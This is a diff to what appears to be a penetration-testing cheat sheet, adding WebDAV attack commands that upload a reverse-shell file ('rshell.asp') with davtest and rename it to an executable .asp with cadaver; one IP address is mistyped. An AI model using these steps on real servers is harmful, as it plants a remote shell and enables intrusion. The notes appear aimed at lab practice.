@@ -31,8 +31,14 @@ ColdFusion
 * https://www.slideshare.net/chrisgates/coldfusion-for-penetration-testers
 
 WEBDAV
-* `$ davtest -url 10.11.1.13`
-
+```bash
+$ davtest -url 10.11..113                                 # test for webdav vulns
+$ davtest -url http://10.11.1.13                          # upload file from local to remote dir (HTTP PUT)
+          -uploadfile rshell.asp -uploadloc rshell.html
+$ cadaver
+dav:!> open 10.11.1.13                                    # open connection to URL
+dav:!> move '/rshell.txt' to '/rshell.asp'                # move .txt -> .asp (now executable)
+```
 
 ## Reverse Shell Tips
 
